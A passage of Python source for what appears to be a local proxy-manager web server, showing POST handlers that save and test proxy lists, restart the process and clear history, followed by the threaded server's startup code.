                    p = json.loads(body.decode("utf-8"))
                    text = p.get("text", "")
                    with open(PROXIES_FILE, "w", encoding="utf-8") as f:
                        f.write(text.strip() + "\n")
                    all_p = load_proxies()
                    with proxy_lock:
                        healthy_proxies.clear()
                    self.send_response(200)
                    self.send_header("Content-Type", "application/json")
                    self.end_headers()
                    self.wfile.write(json.dumps({"ok": True, "count": len(all_p)}).encode("utf-8"))
                except Exception as e:
                    self.send_response(400)
                    self.end_headers()

            elif self.path == "/api/proxies/test":
                test_all_proxies_now()
                self.send_response(200)
                self.send_header("Content-Type", "application/json")
                self.end_headers()
                self.wfile.write(json.dumps({"ok": True}).encode("utf-8"))

            elif self.path == "/api/system/reload":
                self.send_response(200)
                self.send_header("Content-Type", "application/json")
                self.end_headers()
                self.wfile.write(b'{"status": "reloading"}')
                def _do_exit():
                    time.sleep(0.5)
                    os._exit(0)
                threading.Thread(target=_do_exit, daemon=True).start()
            elif self.path == "/api/history/clear":
                try:
                    payload = json.loads(body.decode("utf-8")) if body else {}
                except Exception:
                    payload = {}
                only_dead = bool(payload.get("only_dead", False))
                clear_history(only_dead=only_dead)
                self.send_response(200)
                self.send_header("Content-Type", "application/json")
                self.end_headers()
                self.wfile.write(b'{"status": "cleared"}')
        else:
            self.send_response(404)
            self.end_headers()

class ThreadingSimpleServer(socketserver.ThreadingMixIn, http.server.HTTPServer):
    daemon_threads = True

def run():
    init_db()
    t = threading.Thread(target=proxy_health_worker, daemon=True)
    t.start()
    socketserver.TCPServer.allow_reuse_address = True
    server = ThreadingSimpleServer(("", PORT), Handler)
    print(f"Server jalan: http://localhost:{PORT}")
    logging.info(f"Server started on port {PORT}")
    server.serve_forever()

if __name__ == "__main__":
    run()
